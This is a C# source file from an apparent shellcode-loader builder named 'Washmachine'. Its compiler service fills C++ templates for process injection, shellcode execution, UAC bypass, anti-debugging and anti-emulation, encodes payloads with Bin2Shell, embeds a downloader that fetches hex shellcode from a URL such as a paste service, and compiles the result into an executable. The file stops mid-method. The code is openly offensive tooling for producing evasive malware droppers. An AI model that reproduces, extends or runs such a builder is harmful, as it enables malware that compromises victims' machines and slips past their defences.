using System.Globalization;
using System.Diagnostics.CodeAnalysis;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using Washmachine.Logging;
using Washmachine.Models;

namespace Washmachine.Services;

public interface ICompilerService
{
    Task<CompilerResult> CompileAsync(UiData data, CancellationToken cancellationToken = default);
    Task<CompilerToolDiscoveryResult> RegisterManualCompilerAsync(
        string compilerScriptPath,
        CancellationToken cancellationToken = default);
}

/// <summary>
/// Builds C++ source from UI selections and optionally compiles it via available toolchains.
/// </summary>
public sealed class CompilerService : ICompilerService
{
    private const string ProcessLookupHelper = """
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <algorithm>

DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId)
{
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE)
        return 0;

    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);

    DWORD result = 0;

    if (Process32FirstW(snapshot, &entry))
    {
        do
        {
            std::wstring exe = entry.szExeFile;
            std::wstring exeLower = exe;
            std::wstring targetLower = processName;
            std::transform(exeLower.begin(), exeLower.end(), exeLower.begin(), ::towlower);
            std::transform(targetLower.begin(), targetLower.end(), targetLower.begin(), ::towlower);

            if (exeLower == targetLower)
            {
                if (returnProcessId)
                {
                    result = entry.th32ProcessID;
                }
                else
                {
                    HANDLE threadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
                    if (threadSnapshot != INVALID_HANDLE_VALUE)
                    {
                        THREADENTRY32 threadEntry{};
                        threadEntry.dwSize = sizeof(threadEntry);
                        if (Thread32First(threadSnapshot, &threadEntry))
                        {
                            do
                            {
                                if (threadEntry.th32OwnerProcessID == entry.th32ProcessID)
                                {
                                    result = threadEntry.th32ThreadID;
                                    break;
                                }
                            } while (Thread32Next(threadSnapshot, &threadEntry));
                        }

                        CloseHandle(threadSnapshot);
                    }
                }

                break;
            }
        } while (Process32NextW(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return result;
}
""";

    private const string TemplateAntiDebug = "ANTIDEBUGGING";
    private const string TemplateProcessInjection = "PSINJECTION";
    private const string TemplateShellcodeExecution = "SHELLCODEEXECUTION";
    private const string TemplateUacBypass = "UACB";
    private const string TemplateGenericShellcode = "GENERICSHELLCODE";
    private const string TemplateGuardrail = "GUARDRAIL";
    private const string TemplateSelectionControlName = "templateComboBox";

    private const string PlaceholderProcessLookupHelper = "PROCESS_LOOKUP_HELPER";
    private const string PlaceholderShellcodeSource = "SHELLCODE_SOURCE";
    private const string PlaceholderShellcodeUrl = "SHELLCODE_URL";
    private const string PlaceholderGuardrails = "GUARDRAILS";
    private const string PlaceholderAntiDebug = "ANTI_DEBUGGING";
    private const string PlaceholderUacBypass = "UAC_BYPASS";
    private const string PlaceholderProcessInjection = "PROCESS_INJECTION";
    private const string PlaceholderShellcodeExecution = "SHELLCODE_EXECUTION";
    private const string PlaceholderSnippetIncludes = "SNIPPET_INCLUDES";
    private const string PlaceholderSnippetImplementations = "SNIPPET_IMPLEMENTATIONS";
    private const string PlaceholderPreamble = "PREAMBLE";

    private static readonly string[] CompilerExecutables = { "cl.exe", "g++.exe", "clang++.exe" };
    private static readonly string[] EncoderKeys =
    {
        "bin2hexEncoder",
        "bin2shellEncoder",
        "bin2ShellEncoder",
        "bin2shellEncoding",
        "bin2ShellEncoding"
    };
    private static readonly string[] EnvelopeKeys =
    {
        "bin2hexEnvelope",
        "bin2shellEnvelope",
        "bin2ShellEnvelope",
        "bin2shellEnv",
        "bin2ShellEnv"
    };
    private static readonly string[] AntiEmulationSelectionKeys =
    {
        "bin2shellOptions",
        "bin2ShellOptions",
        "bin2shellOptionCombo",
        "bin2ShellOptionCombo",
        "bin2shellAntiCombo",
        "bin2ShellAntiCombo",
        "bin2shellAntiOptions",
        "bin2ShellAntiOptions",
        "bin2shellAntiEmulation",
        "bin2ShellAntiEmulation",
        "bin2shellSelection",
        "bin2ShellSelection"
    };
    private static readonly string[] AntiEmulationArgsKeys =
    {
        "bin2shellArgs",
        "bin2ShellArgs",
        "bin2shellOptionArgs",
        "bin2ShellOptionArgs",
        "bin2shellAntiArgs",
        "bin2ShellAntiArgs"
    };

    private readonly IAppPaths _paths;
    private readonly IBin2ShellRunner _bin2ShellRunner;
    private readonly ICodeSnippetCatalogService _snippets;
    private readonly ICompilerToolLocator _toolLocator;
    private readonly IAppLogger _logger;

    public CompilerService(
        IAppPaths paths,
        IBin2ShellRunner bin2ShellRunner,
        ICodeSnippetCatalogService snippets,
        ICompilerToolLocator toolLocator,
        IAppLogger logger)
    {
        _paths = paths ?? throw new ArgumentNullException(nameof(paths));
        _bin2ShellRunner = bin2ShellRunner ?? throw new ArgumentNullException(nameof(bin2ShellRunner));
        _snippets = snippets ?? throw new ArgumentNullException(nameof(snippets));
        _toolLocator = toolLocator ?? throw new ArgumentNullException(nameof(toolLocator));
        _logger = logger ?? throw new ArgumentNullException(nameof(logger));
    }

    public async Task<CompilerResult> CompileAsync(UiData data, CancellationToken cancellationToken = default)
    {
        ArgumentNullException.ThrowIfNull(data);

        ValidateEnvironment();

        var notes = new List<string>();
        CompilerToolDiscoveryResult? discovery = null;
        string? sessionDir = null;

        try
        {
            sessionDir = _paths.CreateCompilationSessionDirectory();
            notes.Add($"Session log directory: {sessionDir}");
            _logger.Debug($"Session log: {sessionDir}");

            SaveSessionSettings(sessionDir, data);

            discovery = await TryDiscoverCompilerAsync(notes, cancellationToken).ConfigureAwait(false);

            var template = ResolveTemplate(data);
            notes.Add($"Template: {template.Display} ({template.Id}).");

            // Build the plan, render the template, then compile if a toolchain is available.
            var plan = new CppCompilationPlan();
            var shellcodeSource = DetermineShellcodeSource(data);

            await ApplyShellcodeAsync(plan, data, shellcodeSource, notes, cancellationToken).ConfigureAwait(false);
            ApplyFeatureSelections(plan, data, template, notes);

            var sourceCode = RenderTemplate(plan, template);
            var sourcePath = await PersistSourceAsync(sourceCode, cancellationToken).ConfigureAwait(false);

            // Copy the .cpp to the session log before compilation.
            CopyToSessionDir(sessionDir, sourcePath, "source.cpp");

            notes.Add($"Generated C++ source at {sourcePath}.");
            _logger.Debug($"Source saved: {sourcePath}");

            notes.Add("Compiling...");
            _logger.Info("Compiling...");

            var compilerDirectory = ResolveCompilerDirectory(discovery);
            var conversionResult = await ExecuteConversionAsync(sourcePath, compilerDirectory, notes, cancellationToken).ConfigureAwait(false);

            DeleteTemporarySource(sourcePath, notes);

            SaveSessionLog(sessionDir, notes, conversionResult);

            // Copy the compiled binary into the session folder for later analysis
            if (conversionResult.Success && !string.IsNullOrWhiteSpace(conversionResult.OutputExePath)
                && File.Exists(conversionResult.OutputExePath))
            {
                var artifactName = Path.GetFileName(conversionResult.OutputExePath);
                CopyToSessionDir(sessionDir, conversionResult.OutputExePath, artifactName);
                _logger.Debug($"Binary artifact saved: {artifactName}");
            }

            return new CompilerResult(conversionResult.Success, null, sourceCode, notes, discovery, conversionResult);
        }
        catch (OperationCanceledException)
        {
            _logger.Warn("Generation cancelled by user.");
            notes.Add("Generation cancelled.");
            SaveSessionLog(sessionDir, notes, null);
            var cancellation = new CppFileConversionResult(false, "Operation cancelled.");
            return new CompilerResult(false, null, null, notes, discovery, cancellation);
        }
        catch (Exception ex)
        {
            _logger.Error($"Generation failed: {ex.Message}");
            notes.Add(ex.Message);
            SaveSessionLog(sessionDir, notes, null);
            var failure = new CppFileConversionResult(false, ex.Message);
            return new CompilerResult(false, null, null, notes, discovery, failure);
        }
    }

    public async Task<CompilerToolDiscoveryResult> RegisterManualCompilerAsync(string compilerScriptPath, CancellationToken cancellationToken = default)
    {
        if (string.IsNullOrWhiteSpace(compilerScriptPath))
            throw new ArgumentException("Compiler script path is required.", nameof(compilerScriptPath));

        var normalizedPath = compilerScriptPath.Trim();

        try
        {
            var result = await _toolLocator.AddManualCandidateAsync(normalizedPath, cancellationToken).ConfigureAwait(false);
            _logger.Ok($"Manual compiler script registered: {normalizedPath}");
            return result;
        }
        catch (OperationCanceledException)
        {
            throw;
        }
        catch (Exception ex)
        {
            _logger.Error($"Failed to register compiler script: {ex.Message}");
            throw;
        }
    }

    private void ValidateEnvironment()
    {
        var errors = _paths.Validate();
        if (errors.Count == 0)
            return;

        foreach (var error in errors)
        {
            _logger.Error(error);
        }

        throw new InvalidOperationException("Required project assets are missing.");
    }

    private async Task<CompilerToolDiscoveryResult?> TryDiscoverCompilerAsync(
        ICollection<string> notes,
        CancellationToken cancellationToken)
    {
        try
        {
            return await _toolLocator.DiscoverAsync(cancellationToken).ConfigureAwait(false);
        }
        catch (OperationCanceledException)
        {
            throw;
        }
        catch (Exception ex)
        {
            var message = $"Compiler tool discovery failed: {ex.Message}";
            notes.Add(message);
            _logger.Warn(message);
            return null;
        }
    }

    private CodeTemplateDefinition ResolveTemplate(UiData data)
    {
        string selectedId = string.Empty;
        if (data.ComboBoxes.TryGetValue(TemplateSelectionControlName, out var rawSelection))
            selectedId = rawSelection?.Trim() ?? string.Empty;

        if (!string.IsNullOrWhiteSpace(selectedId) && _snippets.TryGetTemplate(selectedId, out var template))
            return template;

        var allTemplates = _snippets.GetTemplates();
        if (allTemplates == null || allTemplates.Count == 0)
            throw new InvalidOperationException("No code templates are defined in the snippet catalog.");

        if (!string.IsNullOrWhiteSpace(selectedId))
            _logger.Warn($"Template '{selectedId}' not found. Falling back to '{allTemplates[0].Id}'.");

        return allTemplates[0];
    }

    private async Task ApplyShellcodeAsync(
        CppCompilationPlan plan,
        UiData data,
        ShellcodeSource source,
        ICollection<string> notes,
        CancellationToken cancellationToken)
    {
        switch (source.Kind)
        {
            case ShellcodeSourceKind.None:
                _logger.Warn("No shellcode source supplied; using default stub.");
                notes.Add("No external shellcode supplied; using default stub.");
                break;

            case ShellcodeSourceKind.File:
                await EncodeShellcodeFromFileAsync(plan, source.Value, data, notes, cancellationToken).ConfigureAwait(false);
                break;

            case ShellcodeSourceKind.Raw:
                string savedPath = SaveRawHexToBin(source.Value);
                notes.Add($"Raw shellcode saved to {savedPath}.");
                await EncodeShellcodeFromFileAsync(plan, savedPath, data, notes, cancellationToken).ConfigureAwait(false);
                break;

            case ShellcodeSourceKind.Url:
                InjectUrlShellcode(plan, source.Value, notes);
                break;

            case ShellcodeSourceKind.Generic:
                ConfigureGenericShellcode(plan, source.Value, notes);
                break;

            case ShellcodeSourceKind.WebPayload:
                plan.UsesWebPayload = true;
                plan.WebPayloadCodeBlock = source.Value;
                // Read the structured preamble if the coordinator provided it separately.
                if (data.TextBoxes.TryGetValue("__webPayloadPreamble__", out var preambleBlock) &&
                    !string.IsNullOrWhiteSpace(preambleBlock))
                {
                    plan.WebPayloadPreamble = preambleBlock;
                }
                notes.Add("Web payload code block injected from wizard.");
                _logger.Debug("Web payload code block applied.");
                break;

            default:
                throw new InvalidOperationException($"Unsupported shellcode source '{source.Kind}'.");
        }
    }

    private async Task EncodeShellcodeFromFileAsync(
        CppCompilationPlan plan,
        string filePath,
        UiData data,
        ICollection<string> notes,
        CancellationToken cancellationToken)
    {
        if (!File.Exists(filePath))
            throw new FileNotFoundException("Shellcode file not found.", filePath);

        var args = BuildBin2ShellArguments(data, filePath);
        _logger.Debug($"Bin2Shell args: {string.Join(" ", args.Select(QuoteArg))}");

        string encoded = await _bin2ShellRunner
            .RunAsync(args, cancellationToken: cancellationToken)
            .ConfigureAwait(false);

        if (string.IsNullOrWhiteSpace(encoded))
            throw new InvalidOperationException("Bin2Shell returned empty output.");

        bool patched = false;
        encoded = PatchBin2ShellPayloadLambda(encoded, out patched);
        if (patched)
        {
            _logger.Debug("Normalized Bin2Shell payload lambda capture.");
        }

        encoded = RepairCStringLiteralQuotes(encoded);

        plan.EncodedShellcodeSnippet = encoded.Trim();
        notes.Add("Encoded shellcode prepared.");
        _logger.Debug("Encoded shellcode prepared.");
    }

    private void ConfigureGenericShellcode(
        CppCompilationPlan plan,
        string selection,
        ICollection<string> notes)
    {
        const string sectionHeader = "GENERIC SHELLCODE PAYLOADS FOR TESTINGS";

        if (string.IsNullOrWhiteSpace(selection))
            throw new InvalidOperationException("Generic shellcode selection is required.");

        if (!_snippets.TryGetSectionByHeader(sectionHeader, out var section))
            throw new InvalidOperationException($"Snippet section '{sectionHeader}' is missing in the catalog.");

        var trimmedSelection = selection.Trim();

        if (!section.TryGetItem(trimmedSelection, out var item))
            throw new InvalidOperationException($"Generic shellcode '{trimmedSelection}' not found in snippet section.");

        plan.GenericShellcodeSnippet = item.Snippet;
        plan.UsesGenericShellcode = true;
        LogSnippetEnabled(section.Template, item.Id, notes);
    }

    private void InjectUrlShellcode(CppCompilationPlan plan, string url, ICollection<string> notes)
    {
        if (string.IsNullOrWhiteSpace(url))
            throw new ArgumentException("URL value is required.", nameof(url));

        var escaped = EscapeForCxxString(url.Trim());
        plan.UrlShellcodeSnippet = $"PCHAR code_blob = UrlDownloadHexTextA((PCHAR)\"{escaped}\", &dwSize);";
        notes.Add("Shellcode URL embedded into plan.");
        _logger.Debug("Shellcode URL embedded.");
    }

    private static string PatchBin2ShellPayloadLambda(string output, out bool patched)
    {
        if (string.IsNullOrWhiteSpace(output))
        {
            patched = false;
            return output ?? string.Empty;
        }

        // Keep Bin2Shell payload initializers captureless. They are emitted at file scope,
        // and capture-default lambdas are invalid outside local function scopes.
        string updated = Bin2ShellPayloadLambdaRegex.Replace(output, match =>
            match.Groups[1].Value + "[]" + match.Groups[2].Value);

        patched = !string.Equals(output, updated, StringComparison.Ordinal);
        return updated;
    }

    /// <summary>
    /// Repairs unescaped double-quote characters inside C string literal continuations.
    /// Bin2shell's base91 alphabet includes <c>"</c>. When the encoder wraps long payloads
    /// into multi-line C string literals, <c>"</c> characters at line-split boundaries can
    /// produce <c>""X..."</c> (empty string + invalid suffix) instead of <c>"\"X..."</c>.
    /// This pass re-escapes any unescaped <c>"</c> inside string content lines.
    /// </summary>
    private static string RepairCStringLiteralQuotes(string code)
    {
        if (string.IsNullOrWhiteSpace(code))
            return code ?? string.Empty;

        var lines = code.Split('\n');
        var sb = new StringBuilder(code.Length + 128);
        bool inMultiLineString = false;

        for (int i = 0; i < lines.Length; i++)
        {
            var line = lines[i];
            var trimmed = line.TrimStart();

            // Detect start of multi-line string: `const char xxx[] =`
            // or `"..." (continuation line)`
            if (trimmed.StartsWith("\"", StringComparison.Ordinal) && inMultiLineString)
            {
                // This is a continuation line: "...content..."
                // Extract the content between the outer quotes and re-escape inner quotes
                var repaired = RepairStringLine(trimmed);
                sb.Append(line.AsSpan(0, line.Length - trimmed.Length)); // preserve indent
                sb.Append(repaired);
            }
            else
            {
                sb.Append(line);
            }

            // Track if we're inside a multi-line string declaration
            if (trimmed.Contains("code_blob_text[]", StringComparison.Ordinal) ||
                trimmed.Contains("code_blob_text =", StringComparison.Ordinal))
            {
                inMultiLineString = true;
            }

            // End of multi-line string: line ending with `";` (with trailing whitespace)
            if (inMultiLineString && trimmed.TrimEnd().EndsWith(";", StringComparison.Ordinal))
            {
                inMultiLineString = false;
            }

            if (i < lines.Length - 1)
                sb.Append('\n');
        }

        return sb.ToString();
    }

    /// <summary>
    /// Given a line like <c>"abc\"def"ghi..."</c>, ensures all <c>"</c> inside the
    /// string content are properly escaped as <c>\"</c>.
    /// </summary>
    private static string RepairStringLine(string trimmedLine)
    {
        // Expected form: "...content..." possibly followed by trailing whitespace
        // Find the opening quote
        if (trimmedLine.Length < 2 || trimmedLine[0] != '"')
            return trimmedLine;

        // Find the real closing quote: last `"` that isn't preceded by `\`
        int closeIdx = -1;
        for (int i = trimmedLine.Length - 1; i > 0; i--)
        {
            if (trimmedLine[i] == '"')
            {
                // Check it's not escaped
                int backslashes = 0;
                for (int j = i - 1; j >= 0 && trimmedLine[j] == '\\'; j--)
                    backslashes++;
                if (backslashes % 2 == 0)
                {
                    closeIdx = i;
                    break;
                }
            }
        }

        if (closeIdx <= 0)
            return trimmedLine; // Can't parse, leave as-is

        // Extract content between quotes
        var content = trimmedLine.AsSpan(1, closeIdx - 1);
        var suffix = trimmedLine.AsSpan(closeIdx + 1);

        // Re-escape: first unescape all `\"` to `"`, then escape all `"` to `\"`
        var unescaped = content.ToString().Replace("\\\"", "\"");
        var reescaped = unescaped.Replace("\"", "\\\"");

        return $"\"{reescaped}\"{suffix}";
    }

    /// <summary>
    /// Replaces all captureless C++ lambdas <c>= []() {</c> with <c>= [&amp;]() {</c>
    /// so local variables like <c>enc_len</c> and <c>enc_buf</c> are accessible.
    /// </summary>
    private static string PatchCapturelessLambdas(string code)
    {
        if (string.IsNullOrWhiteSpace(code))
            return code ?? string.Empty;

        // Match  "= []() {" or "= [] () {" (with optional whitespace variants).
        return CapturelessLambdaRegex.Replace(code, m => m.Groups[1].Value + "[&]" + m.Groups[2].Value);
    }

    private static readonly Regex CapturelessLambdaRegex =
        new(@"(=\s*)\[\s*\](\s*\()", RegexOptions.Compiled);

    /// <summary>
    /// Wraps every <c>bin2shell_fetch_payload_from_url(...)</c> call with
    /// <c>bin2shell_maybe_decode_hex(...)</c> so that hex-text payloads hosted on
    /// paste services are transparently converted to raw binary.
    /// </summary>
    private static string WrapFetchWithHexDecode(string body)
    {
        if (string.IsNullOrWhiteSpace(body))
            return body ?? string.Empty;

        return FetchPayloadCallRegex.Replace(body,
            "bin2shell_maybe_decode_hex(bin2shell_fetch_payload_from_url($1))");
    }

    private static readonly Regex FetchPayloadCallRegex =
        new(@"bin2shell_fetch_payload_from_url\(([^)]+)\)", RegexOptions.Compiled);

    /// <summary>
    /// C++ helper function injected into the web payload preamble.
    /// Auto-detects hex-text payloads (e.g. "0x48 0x83 0xEC ...") and converts
    /// them to raw binary bytes.  Raw binary content passes through unchanged.
    /// </summary>
    private const string CppHexDecodeHelper = """

        static std::vector<unsigned char> bin2shell_maybe_decode_hex(std::vector<unsigned char> raw) {
            if (raw.size() < 4) return raw;
            // Check if content looks like hex text ("0x" prefix after optional whitespace).
            size_t start = 0;
            while (start < raw.size() && (raw[start] == ' ' || raw[start] == '\r' ||
                   raw[start] == '\n' || raw[start] == '\t')) ++start;
            if (start + 1 >= raw.size() || raw[start] != '0' ||
                (raw[start+1] != 'x' && raw[start+1] != 'X'))
                return raw; // Not hex text — return as-is (raw binary).

            auto hexval = [](unsigned char ch) -> int {
                if (ch >= '0' && ch <= '9') return ch - '0';
                if (ch >= 'a' && ch <= 'f') return 10 + ch - 'a';
                if (ch >= 'A' && ch <= 'F') return 10 + ch - 'A';
                return -1;
            };

            std::vector<unsigned char> result;
            result.reserve(raw.size() / 4);
            for (size_t i = start; i < raw.size(); ) {
                unsigned char c = raw[i];
                if (c == ' ' || c == '\r' || c == '\n' || c == '\t') { ++i; continue; }
                if (c == '0' && i + 3 < raw.size() &&
                    (raw[i+1] == 'x' || raw[i+1] == 'X')) {
                    int h = hexval(raw[i+2]);
                    int l = hexval(raw[i+3]);
                    if (h >= 0 && l >= 0) {
                        result.push_back(static_cast<unsigned char>((h << 4) | l));
                        i += 4;
                        continue;
                    }
                }
                ++i;
            }
            return result;
        }
        """;

    private async Task<string> PersistSourceAsync(string sourceCode, CancellationToken cancellationToken)
    {
        string directory = _paths.EnsureTempSourceDirectory();
        Directory.CreateDirectory(directory);

        // Clean up leftover .cpp files from previous compilations to prevent
        // CppFileConverter from compiling stale sources alongside the new one.
        try
        {
            foreach (var staleFile in Directory.GetFiles(directory, "*.cpp", SearchOption.TopDirectoryOnly))
            {
                try { File.Delete(staleFile); } catch { /* ignore */ }
            }
        }
        catch { /* ignore enumeration errors */ }

        string fileName = $"wash_{DateTime.UtcNow:yyyyMMdd_HHmmss}_{Guid.NewGuid():N}.cpp";
        string path = Path.Combine(directory, fileName);

        await File.WriteAllTextAsync(path, sourceCode, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false), cancellationToken)
            .ConfigureAwait(false);

        return path;
    }


    private static string ResolveCompilerDirectory(CompilerToolDiscoveryResult? discovery)
    {
        var best = discovery?.Best;
        if (best == null)
            return string.Empty;

        var visited = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        foreach (var root in EnumerateCompilerRoots(best))
        {
            if (string.IsNullOrWhiteSpace(root) || !Directory.Exists(root) || !visited.Add(root))
                continue;

            var resolved = TryFindCompilerDirectory(root);
            if (!string.IsNullOrWhiteSpace(resolved))
                return resolved;
        }

        return string.Empty;
    }

    private static IEnumerable<string> EnumerateCompilerRoots(CompilerToolCandidate best)
    {
        if (!string.IsNullOrWhiteSpace(best.InstallationPath))
            yield return best.InstallationPath;

        if (!string.IsNullOrWhiteSpace(best.Path))
        {
            var current = Path.GetDirectoryName(best.Path);
            while (!string.IsNullOrWhiteSpace(current))
            {
                yield return current;
                current = Directory.GetParent(current)?.FullName;
            }
        }

        var envCandidates = new[]
        {
            Environment.GetEnvironmentVariable("VCToolsInstallDir"),
            Environment.GetEnvironmentVariable("VCINSTALLDIR"),
            Environment.GetEnvironmentVariable("VSINSTALLDIR")
        };

        foreach (var candidate in envCandidates)
        {
            if (!string.IsNullOrWhiteSpace(candidate))
                yield return candidate;
        }
    }

    private static string TryFindCompilerDirectory(string root)
    {
        var msvc = TryGetMsvcCompilerDirectory(root);
        if (!string.IsNullOrWhiteSpace(msvc))
            return msvc;

        foreach (var executable in CompilerExecutables)
        {
            var found = TryGetExecutableDirectory(root, executable);
            if (!string.IsNullOrWhiteSpace(found))
                return found;
        }

        return string.Empty;
    }

    private static string TryGetMsvcCompilerDirectory(string root)
    {
        var candidateRoots = new[]
        {
            Path.Combine(root, "VC", "Tools", "MSVC"),
            Path.Combine(root, "Tools", "MSVC")
        };

        foreach (var toolsRoot in candidateRoots)
        {
            if (!Directory.Exists(toolsRoot))
                continue;

            try
            {
                foreach (var versionDir in Directory.EnumerateDirectories(toolsRoot).OrderByDescending(Path.GetFileName))
                {
                    var candidates = new[]
                    {
                        Path.Combine(versionDir, "bin", "Hostx64", "x64"),
                        Path.Combine(versionDir, "bin", "Hostx64", "x86"),
                        Path.Combine(versionDir, "bin", "Hostx86", "x64"),
                        Path.Combine(versionDir, "bin", "Hostx86", "x86")
                    };

                    foreach (var candidate in candidates)
                    {
                        if (File.Exists(Path.Combine(candidate, "cl.exe")))
                            return candidate;
                    }
                }
            }
            catch
            {
                // ignored
            }
        }

        return string.Empty;
    }
    private static string TryGetExecutableDirectory(string root, string executable)
    {
        var direct = Path.Combine(root, executable);
        if (File.Exists(direct))
            return root;

        try
        {
            var match = Directory
                .EnumerateFiles(root, executable, SearchOption.AllDirectories)
                .FirstOrDefault();

            if (!string.IsNullOrWhiteSpace(match))
                return Path.GetDirectoryName(match!) ?? string.Empty;
        }
        catch
        {
            // ignored
        }

        return string.Empty;
    }

    private async Task<CppFileConversionResult> ExecuteConversionAsync(string sourcePath, string compilerDirectory, ICollection<string> notes, CancellationToken cancellationToken)
    {
        if (string.IsNullOrWhiteSpace(sourcePath))
            throw new ArgumentException("Source path must be provided.", nameof(sourcePath));

        string? directory = Path.GetDirectoryName(sourcePath);
        if (string.IsNullOrWhiteSpace(directory))
        {
            const string message = "Unable to determine directory for generated C++ source file.";
            notes.Add(message);
            _logger.Error(message);
            return new CppFileConversionResult(false, message);
        }


        if (string.IsNullOrWhiteSpace(compilerDirectory))
        {
            const string message = "No compiler toolchain detected. Register a compiler or provide a manual cl.exe location.";
            notes.Add(message);
            _logger.Warn(message);
            return new CppFileConversionResult(false, message);
        }

        try
        {
            var result = await CppFileConverter.ConvertAsync(directory, compilerDirectory, _logger, cancellationToken).ConfigureAwait(false);

            if (result.Success)
            {
                notes.Add("Compilation completed.");
                _logger.Debug("CppFileConverter completed successfully.");
            }
            else
            {
                var errorMessage = string.IsNullOrWhiteSpace(result.Error)
                    ? "CppFileConverter reported an unspecified error."
                    : result.Error!;
                notes.Add(errorMessage);
                _logger.Warn(errorMessage);
            }

            return result;
        }
        catch (OperationCanceledException)
        {
            throw;
        }
        catch (Exception ex)
        {
            var message = $"CppFileConverter failed with exception: {ex.Message}";
            notes.Add(message);
            _logger.Error(message);
            return new CppFileConversionResult(false, ex.Message);
        }
    }

    private void DeleteTemporarySource(string sourcePath, ICollection<string> notes)
    {
        if (string.IsNullOrWhiteSpace(sourcePath))
            return;

        try
        {
            if (!File.Exists(sourcePath))
                return;

            File.Delete(sourcePath);
            var message = $"Temporary C++ source deleted: {sourcePath}.";
            notes.Add(message);
            _logger.Debug(message);
        }
        catch (Exception ex)
        {
            var message = $"Failed to delete temporary C++ source '{sourcePath}': {ex.Message}";
            notes.Add(message);
            _logger.Warn(message);
        }
    }

    private void SaveSessionSettings(string? sessionDir, UiData data)
    {
        if (string.IsNullOrWhiteSpace(sessionDir))
            return;

        try
        {
            var sb = new StringBuilder();
            sb.AppendLine($"Timestamp: {DateTime.UtcNow:O}");
            sb.AppendLine();
            sb.AppendLine("=== TextBoxes ===");
            foreach (var entry in data.TextBoxes.OrderBy(k => k.Key))
            {
                string val = entry.Value ?? string.Empty;
                string display = val.Length > 500 ? val[..500] + "...(truncated)" : val;
                sb.AppendLine($"{entry.Key} = {display}");
            }
            sb.AppendLine();
            sb.AppendLine("=== ComboBoxes ===");
            foreach (var entry in data.ComboBoxes.OrderBy(k => k.Key))
                sb.AppendLine($"{entry.Key} = {entry.Value}");
            sb.AppendLine();
            sb.AppendLine("=== ListBoxes ===");
            foreach (var entry in data.ListBoxes.OrderBy(k => k.Key))
            {
                sb.AppendLine($"{entry.Key} =");
                foreach (var item in entry.Value ?? new List<string>())
                    sb.AppendLine($"  - {item}");
            }

            File.WriteAllText(Path.Combine(sessionDir, "settings.txt"), sb.ToString());
        }
        catch (Exception ex)
        {
            _logger.Warn($"Failed to save session settings: {ex.Message}");
        }
    }

    private void SaveSessionLog(string? sessionDir, IReadOnlyList<string> notes, CppFileConversionResult? conversionResult)
    {
        if (string.IsNullOrWhiteSpace(sessionDir))
            return;

        try
        {
            var sb = new StringBuilder();
            sb.AppendLine($"Timestamp: {DateTime.UtcNow:O}");
            sb.AppendLine($"Success: {conversionResult?.Success.ToString() ?? "N/A"}");
            sb.AppendLine($"Error: {conversionResult?.Error ?? "none"}");
            sb.AppendLine();
            sb.AppendLine("=== Notes ===");
            foreach (var note in notes)
                sb.AppendLine(note);

            File.WriteAllText(Path.Combine(sessionDir, "build_log.txt"), sb.ToString());
        }
        catch (Exception ex)
        {
            _logger.Warn($"Failed to save session log: {ex.Message}");
        }
    }

    private void CopyToSessionDir(string? sessionDir, string? sourcePath, string targetName)
    {
        if (string.IsNullOrWhiteSpace(sessionDir) || string.IsNullOrWhiteSpace(sourcePath))
            return;

        try
        {
            if (File.Exists(sourcePath))
                File.Copy(sourcePath, Path.Combine(sessionDir, targetName), overwrite: true);
        }
        catch (Exception ex)
        {
            _logger.Warn($"Failed to copy '{sourcePath}' to session dir: {ex.Message}");
        }
    }


    private void ApplyFeatureSelections(
        CppCompilationPlan plan,
        UiData data,
        CodeTemplateDefinition template,
        ICollection<string> notes)
    {
        ArgumentNullException.ThrowIfNull(template);

        foreach (var placeholder in template.Placeholders)
        {
            if (placeholder == null || placeholder.Kind != TemplatePlaceholderKind.Snippet)
                continue;

            if (string.IsNullOrWhiteSpace(placeholder.SnippetTemplateKey))
            {
                _logger.Warn($"Template placeholder '{placeholder.Name}' is missing a snippet template key.");
                continue;
            }

            var templateKey = placeholder.SnippetTemplateKey.Trim();
            switch (templateKey.ToUpperInvariant())
            {
                case TemplateGuardrail:
                    ApplyGuardrailSelection(plan, data, placeholder.Name, notes);
                    break;
                case TemplateProcessInjection:
                    ApplyProcessInjectionSelection(plan, data, placeholder.Name, notes);
                    break;
                case TemplateShellcodeExecution:
                    ApplyComboSelection(
                        plan,
                        data,
                        templateKey,
                        placeholder.Name,
                        notes,
                        (p, item) => p.ShellcodeExecutionSnippet = item.Snippet);
                    break;
                case TemplateUacBypass:
                    ApplyComboSelection(
                        plan,
                        data,
                        templateKey,
                        placeholder.Name,
                        notes,
                        (p, item) => p.UacBypassSnippet = item.Snippet);
                    break;
                case TemplateAntiDebug:
                    ApplyAntiDebugSelection(plan, data, placeholder.Name, notes);
                    break;
                default:
                    ApplyGenericSnippetSelection(plan, data, placeholder, notes);
                    break;
            }
        }
    }

    private bool TryGetSectionSelections(
        UiData data,
        string templateKey,
        [NotNullWhen(true)] out CodeSnippetSection? section,
        out IReadOnlyList<CodeSnippetItem> selections,
        string? missingMessage = null)
    {
        selections = Array.Empty<CodeSnippetItem>();
        if (!_snippets.TryResolveSection(templateKey, out section))
        {
            _logger.Warn(missingMessage ?? $"Snippet section '{templateKey}' is missing in the catalog.");
            return false;
        }

        selections = ResolveSnippetSelections(data, section);
        return selections.Count > 0;
    }

    private bool TryGetFirstSelection(
        UiData data,
        string templateKey,
        [NotNullWhen(true)] out CodeSnippetSection? section,
        [NotNullWhen(true)] out CodeSnippetItem? selection,
        string? missingMessage = null)
    {
        selection = null;
        if (!TryGetSectionSelections(data, templateKey, out section, out var selections, missingMessage))
            return false;

        selection = selections[0];
        return true;
    }

    private void ApplyComboSelection(
        CppCompilationPlan plan,
        UiData data,
        string templateKey,
        string placeholderName,
        ICollection<string> notes,
        Action<CppCompilationPlan, CodeSnippetItem> apply)
    {
        if (!TryGetFirstSelection(data, templateKey, out var section, out var selection))
            return;

        apply(plan, selection);
        CollectSnippetExtras(plan, selection);
        AddCustomSnippet(plan, placeholderName, selection.Snippet);
        LogSnippetEnabled(section.Template, selection.Id, notes);
    }

    private void ApplyGuardrailSelection(
        CppCompilationPlan plan,
        UiData data,
        string placeholderName,
        ICollection<string> notes)
    {
        if (!TryGetFirstSelection(data, TemplateGuardrail, out var section, out var selection))
            return;

